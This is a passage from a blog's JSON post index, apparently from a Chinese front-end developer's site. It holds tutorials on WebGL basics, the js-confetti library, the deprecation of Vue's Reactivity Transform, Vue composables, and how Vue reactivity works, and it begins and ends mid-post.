fragmentShader = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fragmentShader, source); gl.compileShader(fragmentShader); program = gl.createProgram(); gl.attachShader(program, vertexShader); gl.attachShader(program, fragmentShader); gl.linkProgram(program); 打开属性数组列表中指定索引处（0）的通用顶点属性数组。创建一个用于储存顶点数据或着色数据的缓冲区对象，将其绑定到包含顶点属性（顶点坐标，纹理坐标数据或顶点颜色数据）的 gl.ARRAY_BUFFER，指定缓冲区绑定目标 gl.ARRAY_BUFFER 和将被复制到缓冲区的数据存储区（new Float32Array([0.0])），指定数据存储区的使用方法 gl.STATIC_DRAW，绑定当前缓冲区范围到 gl.ARRAY_BUFFER。 gl.enableVertexAttribArray(0); buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buffer); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0.0]), gl.STATIC_DRAW); gl.vertexAttribPointer(0, 1, gl.FLOAT, false, 0, 0); 使用着色器程序。 gl.useProgram(program); 从向量数组中绘制对象。 gl.drawArrays(gl.POINTS, 0, 1); 绑定 DOM 事件。 document.querySelector(&quot;canvas&quot;).addEventListener(&quot;click&quot;, (evt) =&gt; { const clickXRelativeToCanvas = evt.pageX - evt.target.offsetLeft; const clickXinWebGLCoords = 2.0 * (clickXRelativeToCanvas - gl.drawingBufferWidth / 2) / gl.drawingBufferWidth; gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([clickXinWebGLCoords]), gl.STATIC_DRAW, ); gl.drawArrays(gl.POINTS, 0, 1); }, false); ","link":"https://zkrisj.github.io/post/webgl-jie-shao-he-ji-ben-shi-yong/"},{"title":"🎉JavaScript 五彩纸屑库 js-confetti","content":"介绍 如果您有一个页面，您希望用五彩纸屑特效引起您的用户注意，那么这个插件就是为您准备的。去年介绍过一个很好用的插件 canvas-confetti，掘金年度作者投票按钮的特效就是使用的这个，两者对比如下： 两者都提供了 npm 安装和从 cdn 导入两种使用方式。 canvas-confetti 提供了很多自定义的选项，包括：发射原点、发射数量、扩散角度、发射角度、重力、消失的速度、颜色和形状等。而 js-confetti 自定义的选项比较少，但是体积也小了，压缩文件只有 6KB 多。 js-confetti npm 包体积 35.8 kB，canvas-confetti npm 包体积 66.3 kB。 js-confetti 支持表情符号作为五彩纸屑。 两者特效调用函数都返回 Promise 对象，当添加的五彩纸屑由于五彩纸屑的重力物理而从用户屏幕上消失时变成 resolved 状态。 另外，js-confetti npm 包中包含内置的 TypeScript 类型声明，而 canvas-confetti 需要额外的 npm 包 @types/canvas-confetti 提供 TypeScript 的类型声明。 使用方式 NPM 安装： npm i js-confetti import JSConfetti from 'js-confetti' const confetti = new JSConfetti() function showConfetti() { confetti.addConfetti() } showConfetti() 从 CDN 导入 HTML 页面中（也可以将 JS 文件下载到本地）： &lt;script src=&quot;https://cdn.jsdelivr.net/npm/js-confetti@latest/dist/js-confetti.browser.js&quot;&gt;&lt;/script&gt; 然后访问 JSConfetti 全局变量。 const confetti = new JSConfetti() function showConfetti() { confetti.addConfetti() } showConfetti() 注意：new JSConfetti() 将创建 HTML Canvas 元素并将其添加到页面，因此可以只创建一个并复用它。 类型定义 通过 npm 安装 js-confetti，其内置的 TypeScript 类型声明文件如下： // Type definitions for js-confetti // TypeScript Version: 4.1.2 export = JSConfetti; interface IJSConfettiConfig { canvas?: HTMLCanvasElement, } interface IAddConfettiConfig { confettiRadius?: number, confettiNumber?: number, confettiColors?: string[], emojis?: string[], emojiSize?: number, } declare class JSConfetti { constructor(jsConfettiConfig?: IJSConfettiConfig); addConfetti(confettiConfig?: IAddConfettiConfig): Promise&lt;void&gt;; clearCanvas(): void; } 自定义 canvas 元素 如果需要在自定义 canvas 元素中使用特效，可以将 canvas 元素作为参数传递给 JSConfetti 构造函数。 const canvas = document.getElementById('your_custom_canvas_id') const jsConfetti = new JSConfetti({ canvas }) 使用表情符号 通过向 addConfetti 方法传递选项参数 emojis 和 emojiSize 来使用表情符号作为五彩纸屑。 const jsConfetti = new JSConfetti() jsConfetti.addConfetti({ emojis: ['🌈', '⚡️', '💥', '✨', '💫', '🌸'], emojiSize: 20, }) 自定义五彩纸屑颜色 通过向 addConfetti 方法传递选项参数 confettiColors 来自定义五彩纸屑颜色。 const jsConfetti = new JSConfetti() jsConfetti.addConfetti({ confettiColors: [ '#ff0a54', '#ff477e', '#ff7096', '#ff85a1', '#fbb1bd', '#f9bec7', ], }) 自定义五彩纸屑半径和数量 通过向 addConfetti 方法传递选项参数 confettiRadius 和 confettiNumber 来使用表情符号作为五彩纸屑。 const jsConfetti = new JSConfetti() jsConfetti.addConfetti({ confettiRadius: 6, confettiNumber: 500, }) 清除画布和结束 通过 JSConfetti 类的实例上的 clearCanvas 方法清除画布。addConfetti 方法返回 Promise 对象，特效结束时变成 resolved 状态。 ","link":"https://zkrisj.github.io/post/javascript-wu-cai-zhi-xie-ku-js-confetti/"},{"title":"最新，Vue 中的响应性语法糖已废弃","content":"介绍 自从引入组合式 API 的概念以来，一个主要的未解决的问题就是 ref 和 reactive 到底用哪个。reactive 存在解构丢失响应性的问题，而 ref 需要到处使用 .value 则感觉很繁琐，并且在没有类型系统的帮助时很容易漏掉 .value。 例如，下面的计数器： &lt;template&gt; &lt;button @click=&quot;increment&quot;&gt;{{ count }}&lt;/button&gt; &lt;/template&gt; 使用 ref 定义 count 变量和 increment 方法： let count = ref(0) function increment() { count.value++ } 而使用响应性语法糖，我们可以像这样书写代码： let count = $ref(0) function increment() { count++ } Vue 的响应性语法糖是一个编译时的转换步骤，$ref() 方法是一个编译时的宏命令，它不是一个真实的、在运行时会调用的方法，而是用作 Vue 编译器的标记，表明最终的 count 变量需要是一个响应式变量。 响应式的变量可以像普通变量那样被访问和重新赋值，但这些操作在编译后都会变为带 .value 的 ref。所以上面例子中的代码也会被编译成使用 ref 定义的语法。 每一个会返回 ref 的响应式 API 都有一个相对应的、以 $ 为前缀的宏函数。包括以下这些 API： ref -&gt; $ref computed -&gt; $computed shallowRef -&gt; $shallowRef customRef -&gt; $customRef toRef -&gt; $toRef 可以使用 $() 宏来将现存的 ref 转换为响应式变量。 const a = ref(0) let count = $(a) count++ console.log(a.value) // 1 可以使用 $$() 宏来将任何对响应式变量的引用都会保留为对相应 ref 的引用。 let count = $ref(0) console.log(isRef($$(count))) // true $$() 也适用于已解构的 props，因为它们也是响应式的变量。编译器会高效地通过 toRef 来做转换： const { count } = defineProps&lt;{ count: number }&gt;() passAsRef($$(count)) 配置 响应性语法糖是 组合式 API 特有的功能，且必须通过构建步骤使用。 必须，需要 @vitejs/plugin-vue@&gt;=2.0.0，将应用于 SFC 和 js(x)/ts(x) 文件。 // vite.config.js export default { plugins: [ vue({ reactivityTransform: true }) ] } 注意 reactivityTransform 现在是一个插件的顶层选项，而不再是位于 script.refSugar 之中了，因为它不仅仅只对 SFC 起效。 如果是 vue-cli 构建，需要 vue-loader@&gt;=17.0.0，目前仅对 SFC 起效。 // vue.config.js module.exports = { chainWebpack: (config) =&gt; { config.module .rule('vue') .use('vue-loader') .tap((options) =&gt; { return { ...options, reactivityTransform: true } }) } } 如果是 webpack + vue-loader 构建，需要 vue-loader@&gt;=17.0.0，目前仅对 SFC 起效。 // webpack.config.js module.exports = { module: { rules: [ { test: /\\.vue$/, loader: 'vue-loader', options: { reactivityTransform: true } } ] } } 可选，tsconfig.json 文件中添加如下代码, 不然会报错 TS2304: Cannot find name '$ref'.，虽然不影响使用,但是会影响开发体验： &quot;compilerOptions&quot;:{ &quot;types&quot;: [&quot;vue/ref-macros&quot;] } 可选，eslintrc.cjs 文件中添加如下代码，不然会提示 ESLint: '$ref' is not defined.(no-undef)： module.exports = { globals: { $ref: &quot;readonly&quot;, $computed: &quot;readonly&quot;, $shallowRef: &quot;readonly&quot;, $customRef: &quot;readonly&quot;, $toRef: &quot;readonly&quot;, } }; 当启用响应性语法糖时，这些宏函数都是全局可用的、无需手动导入。也可以在 vue 文件中显式引入 vue/macros，这样就不用配置第二和第三步中的 tsconfig.json 和 eslintrc 了。 import { $ref } from 'vue/macros' let count = $ref(0) 已废弃的实验性功能 响应性语法糖曾经是一个实验性功能，且已被废弃，请阅读废弃原因。 在未来的一个小版本更新中，它将会从 Vue core 中被移除。如需继续使用，请通过 Vue Macros 插件。 废弃原因 尤雨溪在2个星期前（2023 年 2 月 21 日上午 10:05 GMT+8），亲自给出了废弃的原因，翻译如下： 正如你们中的许多人已经知道的那样，我们在团队一致同意的情况下正式放弃了这个 RFC。 理由 Reactivity Transform 的最初目标是通过在处理反应状态时提供更简洁的语法来改善开发人员的体验。我们将其作为实验性产品发布，以收集来自现实世界使用情况的反馈。尽管提出了这些好处，我们还是发现了以下问题： 失去 .value 使得更难分辨正在跟踪的内容以及哪条线触发了反应效果。这个问题在小型 SFC 中并不那么明显，但在大型代码库中，心理开销变得更加明显，特别是如果语法也在 SFC 之外使用。 由于 (1)，一些用户选择仅在 SFC 内部使用 Reactivity Transform，这会在不同心智模型之间造成不一致和上下文转换成本。因此，困境在于仅在 SFC 内部使用它会导致不一致，但在 SFC 外部使用它会损害可维护性。 由于仍然会有外部函数期望使用原始引用，因此反应变量和原始引用之间的转换是不可避免的。这最终增加了更多的学习内容和额外的精神负担，我们注意到这比普通的 Composition API 更让初学者感到困惑。 最重要的是，碎片化的潜在风险。尽管这是明确的选择加入，但一些用户对该提议表示强烈反对，原因是他们担心他们将不得不与不同的代码库一起工作，在这些代码库中，有些人选择了使用它，而有些人则没有。这是一个合理的担忧，因为 Reactivity Transform 需要一种不同的心智模型，它会扭曲 JavaScript 语义（变量赋值能够触发反应效果）。 考虑到所有因素，我们认为将其作为一个稳定的功能使用会导致问题多于收益，因此不是一个好的权衡。 迁移计划 该功能已经通过 Vue Macros 以外部包的形式得到支持。 3.3：该功能将被标记为已弃用。它将继续工作，但您应该在此期间迁移到 Vue Macros。 3.4：该功能将从核心中删除，除非使用 Vue Macros，否则将不再有效。 留言 虽然 Reactivity Transform 会从官方包中移除，但我认为这是一个很好的尝试。 写得好。我喜欢详细的 RFC 和基于用户反馈的客观评估。最后的结论很有道理。不要让完美成为优秀的敌人。 虽然我很享受这个功能带来的便利，但我在实际使用中确实发现了这个潜在的碎片问题。在未来的版本中删除此功能可能不太情愿，但工程师应该认真对待。🙂 您是删除所有功能还是仅删除 ref.value 进行转换的部分？响应式 props 解构呢，它会留下来吗？ 我一直在将它用于中等规模的电子商务网站，没有任何问题。我理解删除它背后的基本原理，但在实践中我发现它确实是一个很大的改进。所以我的问题是：现在怎么办？ 是否建议那些讨厌 .value 的人现在尽可能避免使用 ref() 并像以前那样使用 reactive()？ .value 是必要的复杂性。就像任何其他响应式库 xxx.set() 一样。 创建一个转换所有 Reactivity Transform 代码的包应该很容易吧？我也喜欢按照推荐的方式做事。 ... ","link":"https://zkrisj.github.io/post/zui-xin-vue-zhong-de-xiang-ying-xing-yu-fa-tang-yi-fei-qi/"},{"title":"Vue 组合式函数","content":"组合式 API Composition API 是一系列 API 的集合，使我们可以使用函数而不是声明选项的方式书写 Vue 组件。包括： 响应式 API：例如 ref() 和 reactive()，使我们可以直接创建响应式状态、计算属性和侦听器。 生命周期钩子：例如 onMounted() 和 onUnmounted()，使我们可以在组件各个生命周期阶段添加逻辑。 依赖注入：例如 provide() 和 inject()，使我们可以在使用响应式 API 时，利用 Vue 的依赖注入系统。 其他选项：props，emits，name 和 inheritAttrs。如果使用 &lt;script setup&gt;，那么 inheritAttrs 应该是唯一一个需要用额外的 &lt;script&gt; 块书写的选项了。 对比选项式 API 更好的逻辑复用：组合式 API 最基本的优势是它使我们能够通过组合函数来实现更加简洁高效的逻辑复用。在选项式 API 中我们主要的逻辑复用机制是 mixins，而组合式 API 解决了 mixins 的所有缺陷： 不清晰的数据来源：当使用了多个 mixin 时，实例上的数据属性来自哪个 mixin 变得不清晰，这使追溯实现和理解组件行为变得困难。而在组合式函数中使用 ref + 解构模式：让属性的来源在消费组件时一目了然。 命名空间冲突：多个来自不同作者的 mixin 可能会注册相同的属性名，造成命名冲突。若使用组合式函数，你可以通过在解构变量时对变量进行重命名来避免相同的键名。 隐式的跨 mixin 交流：多个 mixin 需要依赖共享的属性名来进行相互作用，这使得它们隐性地耦合在一起。而一个组合式函数的返回值可以作为另一个组合式函数的参数被传入，像普通函数那样。 基于上述理由，我们不再推荐在 Vue 3 中继续使用 mixin。保留该功能只是为了项目迁移的需求和照顾熟悉它的用户。 更灵活的代码组织：许多用户喜欢选项式 API 的原因是它在默认情况下就能够让人写出有组织的代码：大部分代码都自然地被放进了对应的选项里。然而，选项式 API 在单个组件的逻辑复杂到一定程度时，会面临一些无法忽视的限制。 这些限制主要体现在需要处理多个逻辑关注点的组件中，处理相同逻辑关注点的代码被强制拆分在了不同的选项中，位于文件的不同部分。在一个几百行的大组件中，要读懂代码中的一个逻辑关注点，需要在文件中反复上下滚动。另外，如果我们想要将一个逻辑关注点抽取重构到一个可复用的工具函数中，需要从文件的多个不同部分找到所需的正确片段。 而使用组合式 API，与同一个逻辑关注点相关的代码被归为了一组：我们无需再为了一个逻辑关注点在不同的选项块间来回滚动切换。此外，我们现在可以很轻松地将这一组代码移动到一个外部文件中，不再需要为了抽象而重新组织代码，大大降低了重构成本，这在长期维护的大型项目中非常关键。 更好的类型推导：选项式 API 的类型推导在处理 mixins 和依赖注入类型时依然不甚理想。因此，很多想要搭配 TS 使用 Vue 的开发者采用了由 vue-class-component 提供的 Class API。 基于 Class 的 API 非常依赖 ES 装饰器，但 Vue3 没有向 Class API 的方向发展。另外，基于 Class 的 API 和选项式 API 在逻辑复用和代码组织方面存在相同的限制。 相比之下，组合式 API 主要利用基本的变量和函数，它们本身就是类型友好的。用组合式 API 重写的代码可以享受到完整的类型推导，不需要书写太多类型标注。大多数时候，用 TypeScript 书写的组合式 API 代码和用 JavaScript 写都差不太多！这也让许多纯 JavaScript 用户也能从 IDE 中享受到部分类型推导功能。 不再推荐在 Vue3 中使用 Class API，因为组合式 API 提供了很好的 TypeScript 集成，并具有额外的逻辑重用和代码组织优势。 更小的生产包体积： 选项式 API 需要从实例中代理，依赖 this 上下文对象访问属性。对象的属性名不能被压缩。 由于 &lt;script setup&gt; 形式书写的组件模板被编译为了一个内联函数，和 &lt;script setup&gt; 中的代码位于同一作用域，所以被编译的模板可以直接访问 &lt;script setup&gt; 中定义的变量。本地变量的名字可以被压缩。 可以在一个钩子选项式 API 的组件中通过 setup() 选项来使用组合式 API。通常只在以下情况下使用： 需要在非单文件组件中使用组合式 API 时。 需要在基于选项式 API 的组件中集成基于组合式 API 的代码时。 当通过 this 访问从 setup 返回的 ref 时会自动浅层解包。 setup() 自身并不含对组件实例的访问权，即在 setup() 中访问 this 会是 undefined。 可以在选项式 API 中访问组合式 API 暴露的值，但反过来则不行。 唯一可以使用 async setup() 的情况是，该组件是 Suspense 组件的后代。 组合式 API 更适用于大型的项目，而对于中小型项目来说选项式 API 仍然是一个不错的选择。 对比 React Hooks 组合式 API 提供了和 React Hooks 相同级别的逻辑组织能力。 React Hooks React Hooks 在组件每次更新时都会重新调用。 Hooks 有严格的调用顺序，并不可以写在条件分支中。 React 组件中定义的变量会被一个钩子函数闭包捕获，若开发者传递了错误的依赖数组，它会变得“过期”。 昂贵的计算需要使用 useMemo，这也需要传入正确的依赖数组。 在默认情况下，传递给子组件的事件处理函数会导致子组件进行不必要的更新，需要显式的调用 useCallback 做优化。这个优化同样需要正确的依赖数组，并且几乎在任何时候都需要。 不好处理需要在多次渲染间保持引用 (通过 useRef) 的可变状态。 组合式 API 组合式 API 仅调用 setup() 或 &lt;script setup&gt; 的代码一次。这使得代码更符合日常 JavaScript 的直觉，不需要担心闭包变量的问题。 组合式 API 也并不限制调用顺序，还可以有条件地进行调用。 Vue 的响应性系统运行时会自动收集计算属性和侦听器的依赖，因此无需手动声明依赖。 无需手动缓存回调函数来避免不必要的组件更新。Vue 细粒度的响应性系统能够确保在绝大部分情况下组件仅执行必要的更新。 组合式函数 组合式函数(Composables) 是一个利用 Vue 的组合式 API 来封装和复用有状态逻辑的函数。 无状态的逻辑指在接收一些输入后立刻返回所期望的输出。复用无状态逻辑的库有很多，比如 lodash 或 date-fns。 相比之下，有状态逻辑负责管理会随时间而变化的状态。一个简单的例子是跟踪当前鼠标在页面中的位置。在实际应用中，也可能是像触摸手势或与数据库的连接状态这样的更复杂的逻辑。 可以嵌套多个组合式函数：一个组合式函数可以调用一个或多个其他的组合式函数。这使得我们可以像使用多个组件组合成整个应用一样，用多个较小且逻辑独立的单元来组合形成复杂的逻辑，这正是为什么将实现了这一设计模式的 API 集合命名为组合式 API。 使用 组合式函数约定用驼峰命名法命名，并以 use 作为开头。 如果编写的组合式函数会被其他开发者使用，最好在处理输入参数时兼容 ref 而不只是原始的值。 import { unref } from 'vue' function useFeature(maybeRef) { // 若 maybeRef 确实是一个 ref，它的 .value 会被返回 // 否则，maybeRef 会被原样返回 const value = unref(maybeRef) } 推荐的约定是组合式函数始终返回一个包含多个 ref 的普通的非 reactive 对象，这样该对象在组件中被解构为 ref 之后仍可以保持响应性，而从组合式函数返回一个响应式对象会导致在对象解构过程中丢失与组合式函数内状态的响应性连接。 // x 和 y 是两个 ref const { x, y } = useMouse() 如果你更希望以对象属性的形式来使用组合式函数中返回的状态，可以将返回的对象用 reactive() 包装一次，这样其中的 ref 会被自动解包 const mouse = reactive(useMouse()) // mouse.x 链接到了原来的 x ref console.log(mouse.x) Mouse position is at: {{ mouse.x }}, {{ mouse.y }} 如果你的应用用到了服务端渲染 (SSR)，请确保在组件挂载后才调用的生命周期钩子中执行 DOM 相关的副作用，例如：onMounted()。这些钩子仅会在浏览器中被调用，因此可以确保能访问到 DOM。 确保在 onUnmounted() 时清理副作用。举例来说，如果一个组合式函数设置了一个事件监听器，它就应该在 onUnmounted() 中被移除 (就像我们在 useMouse() 示例中看到的一样)。 组合式函数在 &lt;script setup&gt; 或 setup() 钩子中，应始终被同步地调用。在某些场景下，你也可以在像 onMounted() 这样的生命周期钩子中使用他们。 抽取组合式函数不仅是为了复用，也是为了代码组织。随着组件复杂度的增高，你可以基于逻辑问题将组件代码拆分成更小的函数： &lt;script setup&gt; import { useFeatureA } from './featureA.js' import { useFeatureB } from './featureB.js' import { useFeatureC } from './featureC.js' const { foo, bar } = useFeatureA() const { baz } = useFeatureB(foo) const { qux } = useFeatureC(baz) &lt;/script&gt; 在某种程度上，你可以将这些提取出的组合式函数看作是可以相互通信的组件范围内的服务。 如果你正在使用选项式 API，组合式函数必须在 setup() 中调用。且其返回的绑定必须在 setup() 中返回，以便暴露给 this 及其模板： import { useMouse } from './mouse.js' import { useFetch } from './fetch.js' export default { setup() { const { x, y } = useMouse() const { data, error } = useFetch('...') return { x, y, data, error } }, mounted() { // setup() 暴露的属性可以在通过 `this` 访问到 console.log(this.x) } // ...其他选项 } 示例 如果我们要直接在组件中使用组合式 API 实现鼠标跟踪功能，它会是这样的： &lt;script setup&gt; import { ref, onMounted, onUnmounted } from 'vue' const x = ref(0) const y = ref(0) function update(event) { x.value = event.pageX y.value = event.pageY } onMounted(() =&gt; window.addEventListener('mousemove', update)) onUnmounted(() =&gt; window.removeEventListener('mousemove', update)) &lt;/script&gt; &lt;template&gt;Mouse position is at: {{ x }}, {{ y }}&lt;/template&gt; 如果我们想在多个组件中复用这个相同的逻辑，可以把这个逻辑以一个组合式函数的形式提取到外部文件中，并返回需要暴露的状态。 &lt;script setup&gt; import { useMouse } from './mouse.js' const { x, y } = useMouse() &lt;/script&gt; &lt;template&gt;Mouse position is at: {{ x }}, {{ y }}&lt;/template&gt; // mouse.js import { ref } from 'vue' import { useEventListener } from './event' export function useMouse() { const x = ref(0) const y = ref(0) useEventListener(window, 'mousemove', (event) =&gt; { x.value = event.pageX y.value = event.pageY }) return { x, y } } 可以将添加和清除 DOM 事件监听器的逻辑也封装进一个组合式函数中： // event.js import { onMounted, onUnmounted } from 'vue' export function useEventListener(target, event, callback) { // 也可以用字符串形式的 CSS 选择器来寻找目标 DOM 元素 onMounted(() =&gt; target.addEventListener(event, callback)) onUnmounted(() =&gt; target.removeEventListener(event, callback)) } 每一个调用 useMouse() 的组件实例会创建其独有的 x、y 状态拷贝，因此他们不会互相影响。如果有一部分状态需要在多个组件实例间共享，可以使用 reactive() 创建一个响应式对象，或使用其他响应式 API 例如 ref() 或是 computed()，甚至通过一个组合式函数来返回一个全局状态，并将它导入到多个组件中： // store.js import { ref, reactive } from 'vue' export const store = reactive({ count: 0, increment() { this.count++ } }) // 全局状态，创建在模块作用域下 const globalCount = ref(1) export function useCount() { // 局部状态，每个组件都会创建 const localCount = ref(1) return { globalCount, localCount } } &lt;!-- ComponentA.vue --&gt; &lt;template&gt; &lt;button @click=&quot;store.increment&quot;&gt; store.count 来自 A：{{ store.count }} &lt;/button&gt; &lt;button @click=&quot;globalCount++&quot;&gt; globalCount 来自 A：{{ globalCount }} &lt;/button&gt; &lt;button @click=&quot;localCount++&quot;&gt; localCount 来自 A：{{ localCount }} &lt;/button&gt; &lt;/template&gt; &lt;script setup&gt; import { store, useCount } from './store.js' const { globalCount, localCount } = useCount() &lt;/script&gt; &lt;!-- ComponentB.vue --&gt; &lt;template&gt; &lt;button @click=&quot;store.increment()&quot;&gt; store.count 来自 B：{{ store.count }} &lt;/button&gt; &lt;button @click=&quot;globalCount++&quot;&gt; globalCount 来自 B：{{ globalCount }} &lt;/button&gt; &lt;button @click=&quot;localCount++&quot;&gt; localCount 来自 B：{{ localCount }} &lt;/button&gt; &lt;/template&gt; &lt;script setup&gt; import { store, useCount } from './store.js' const { globalCount, localCount } = useCount() &lt;/script&gt; 对比无渲染组件 一些组件可能只包括了逻辑而不需要自己渲染内容，视图输出通过作用域插槽全权交给了消费者组件。我们将这种类型的组件称为无渲染组件。 组合式函数相对于无渲染组件的主要优势是：组合式函数不会产生额外的组件实例开销。 当在整个应用中使用时，由无渲染组件产生的额外组件实例会带来无法忽视的性能开销。 推荐在纯逻辑复用时使用组合式函数，在需要同时复用逻辑和视图布局时使用无渲染组件。 例如一个封装了追踪当前鼠标位置逻辑的组件： &lt;!-- MouseTracker --&gt; &lt;template&gt; &lt;slot :x=&quot;x&quot; :y=&quot;y&quot;/&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { x: 0, y: 0 } }, methods: { update(e) { this.x = e.pageX this.y = e.pageY } }, mounted() { window.addEventListener('mousemove', this.update) }, unmounted() { window.removeEventListener('mousemove', this.update) } } &lt;/script&gt; 父组件中引用： &lt;MouseTracker v-slot=&quot;{ x, y }&quot;&gt; Mouse is at: {{ x }}, {{ y }} &lt;/MouseTracker&gt; 虽然这个模式很有趣，但大部分能用无渲染组件实现的功能都可以通过组合式 API 以另一种更高效的方式实现，并且还不会带来额外组件嵌套的开销。就像上面我们在 useMouse() 示例中一样更高效地实现追踪鼠标位置的功能。 ","link":"https://zkrisj.github.io/post/vue-zu-he-shi-han-shu/"},{"title":"Vue 中的响应性","content":"响应性本质 Vue 组件状态都是由响应式的 JavaScript 对象组成的，当更改它们时，视图会随即自动更新。本质上，响应性是一种可以使我们声明式地处理变化的编程范式。一个典型例子是 Excel 表格： A B C 0 1 1 2 2 3 这里单元格 A2 中的值是通过公式 = A0 + A1 来定义的 (可以在 A2 上点击来查看或编辑该公式)，因此最终得到的值为 3。当更改 A0 或 A1 时，A2 也会随即自动更新。 JavaScript 代码： let A0 = 1 let A1 = 2 let A2 function update() { A2 = A0 + A1 } A0 和 A1 被视为这个作用的依赖（dependency），因为它们的值被用来执行这个作用。 update() 函数会产生一个副作用，或者就简称为作用（effect），因为它会更改程序里的状态。 Vue 中的响应性是如何工作的 我们无法直接追踪对上述示例中局部变量的读写，原生 JavaScript 没有提供任何机制能做到这一点。但是我们是可以追踪对象属性的读写的，在 JavaScript 中有两种劫持 property 访问的方式：getter / setters 和 Proxies。Vue2 使用 getter / setters 完全是出于支持旧版本浏览器的限制。而在 Vue3 中则使用了 Proxy 来创建响应式对象，仅将 getter / setter 用于 ref。下面的伪代码说明了它们是如何工作的： function reactive(obj) { return new Proxy(obj, { get(target, key) { track(target, key) return target[key] }, set(target, key, value) { target[key] = value trigger(target, key) } }) } function ref(value) { const refObject = { get value() { track(refObject, 'value') return value }, set value(newValue) { value = newValue trigger(refObject, 'value') } } return refObject } track() 方法会检查当前是否有正在运行的副作用（update）。如果有，会将当前这个副作用作为新订阅者添加到存储了所有该属性的订阅者的 Set 中。 // 运行的副作用 let activeEffect function track(target, key) { if (activeEffect) { const effects = getSubscribersForProperty(target, key) effects.add(activeEffect) } } trigger() 方法会查找该属性的所有订阅副作用，并执行它们。 function trigger(target, key) { const effects = getSubscribersForProperty(target, key) effects.forEach((effect) =&gt; effect()) } 接下来，我们需要一个函数 whenDepsChange()，能够在依赖变化时调用 update()，产生一个副作用。 function whenDepsChange(update) { const effect = () =&gt; { activeEffect = effect update() activeEffect = null } effect() } 它将原本的 update 函数包装在了一个副作用函数中。在运行实际的更新之前，这个外部函数会将自己设为当前运行的副作用。这使得在更新期间的 track() 调用都能定位到这个当前运行的副作用。现在，我们就创建了一个能自动跟踪其依赖的副作用，它会在任意依赖被改动（update）时重新运行。我们称其为响应式副作用。 whenDepsChange() 函数将完成以下任务： 当一个变量被读取时进行追踪，例如我们执行了表达式 A0 + A1 的计算，则 A0 和 A1 都被读取到了。 如果一个变量在当前运行的副作用中被读取了，就将该副作用设为此变量的一个订阅者。例如由于 A0 和 A1 在 update() 执行时被访问到了，则 update() 需要在第一次调用之后成为 A0 和 A1 的订阅者。 监测一个变量的变化，例如当我们给 A0 赋了一个新值后，应该通知所有订阅了此变量的副作用重新执行。 watchEffect Vue 提供了一个 API 来创建响应式副作用 watchEffect()，它的使用方式和上面的函数 whenDepsChange() 非常相似。我们用真正的 Vue API 改写上面的例子： import { ref, watchEffect } from 'vue' const A0 = ref(0) const A1 = ref(1) const A2 = ref() watchEffect(() =&gt; { // 追踪 A0 和 A1 A2.value = A0.value + A1.value }) // 将触发副作用 A0.value = 2 computed 使用一个响应式副作用来更改一个 ref 并不是最优解，使用计算属性会更直观简洁： import { ref, computed } from 'vue' const A0 = ref(0) const A1 = ref(1) const A2 = computed(() =&gt; A0.value + A1.value) A0.value = 2 在内部，computed 会使用响应式副作用来管理失效与重新计算的过程。 响应式副作用更新 DOM 常见的响应式副作用的使用场景是：更新 DOM，例如，一个简单的响应式渲染： import { ref, watchEffect } from 'vue' const count = ref(0) watchEffect(() =&gt; { document.body.innerHTML = `计数：${count.value}` }) // 更新 DOM count.value++ Vue 组件使用了比 innerHTML 更高效的方式（虚拟 DOM）来更新 DOM。 响应式 API ref vs reactive ref 可以接受任何值类型，返回一个响应式的、可更改的 ref 对象，它只有一个指向其内部值的属性 .value， 所有对 .value 的操作都将被追踪，并且写操作会触发与之相关的副作用。在模板中作为顶层属性被访问时，会被自动 解包，不需要使用 .value。 reactive 返回一个对象的响应式代理，仅对对象类型有效（对象、数组和 Map、Set 这样的集合类型），而对 string、number 和 boolean 这样的 原始类型 无效。由于我们访问的是代理对象的自身属性，所以不需要 .value。 console.log(ref(0)) // =&gt; RefImpl console.log(reactive({value: 0}) // =&gt; Proxy 将一个对象（引用类型）赋值给 ref 时： 会用 reactive() 自动转换它的 .value，将其转为具有深层次响应式的对象（shallowRef 不会转换）； .value 可以替换整个对象，而不失去响应性（shallowRef 会失去响应性）。 let state = reactive({ count: 0 }) // ({ count: 0 }) 将不再被追踪（响应性连接已丢失！） state = reactive({ count: 1 }) const objectRef = ref({ count: 0 }) // 是响应式的替换 objectRef.value = { count: 1 } console.log(isProxy(objectRef.value), isReactive(objectRef.value)); // true true 简言之，如果 ref 的参数是基本类型，会使用 Object.defineProperty() 的 getter / setter 定义响应式；如果 ref 的参数是引用类型，底层会使用 reactive 的 Proxy 定义响应式，变成这样：{ value: reactive(obj) }。所以 ref(obj) 等价于 { value: reactive(obj) }。 ref 被嵌套在一个 reactive 对象中，作为其属性被访问或更改时，或将一个 ref 赋值给一个 reactive 的属性时，该 ref 会被会自动解包（shallowReactive 不会解包）。 const count = ref(0) const state = reactive({ count }) console.log(state.count) // 0 state.count = 1 console.log(count.value) // 1 const obj = reactive({}) obj.count = count console.log(obj.count) // 1 console.log(obj.count === count.value) // true 但 ref 被嵌套在 reactive 数组或 Map 这样的原生集合类型中时，不会 执行 ref 的解包： const books = reactive([ref('Vue 3 Guide')]) // 这里需要 .value console.log(books[0].value) const map = reactive(new Map([['count', ref(0)]])) // 这里需要 .value console.log(map.get('count').value) 将 reactive 对象的属性赋值、解构至本地变量，或是将属性传入一个函数时，会失去响应性，因为对局部变量的访问不再触发 get / set 代理捕获器。 const state = reactive({ count: 0 }) let n = state.count // 失去响应性，不会影响原始的 state n++ console.log(n, state.count); // 1 0 const callSomeFunction = n =&gt; n++ callSomeFunction(state.count) console.log(n, state.count); // 1 0 let { count } = state // 失去响应性，不会影响原始的 state count++ console.log(count, state.count); // 1 0 而 ref 被传递给函数、为其 .value 赋值，或是从一般对象上被解构时，不会丢失响应性。 const objectRef = ref({ count: 0 }) // 包含对象类型值的 ref 可以响应式地替换整个对象 objectRef.value = { count: 1 } const obj = { foo: ref(1), bar: ref(2) } // 函数接收一个 ref，需要通过 .value 取值，会保持响应性 const callSomeFunction = n =&gt; n.value++ callSomeFunction(obj.foo) console.log(obj.foo.value); // 2 // 被解构时，仍然是响应式的 const { foo, bar } = obj foo.value++ console.log(obj.foo.value); // 3 简言之，ref() 让我们能创造一种对任意值的 “引用”，并能够在不丢失响应性的前提下传递这些引用。所以 ref() 经常用于将逻辑提取到 组合函数 中，组合式函数始终返回一个包含多个 ref 的普通（非 reactive）对象，这样该对象在组件中被解构为 ref 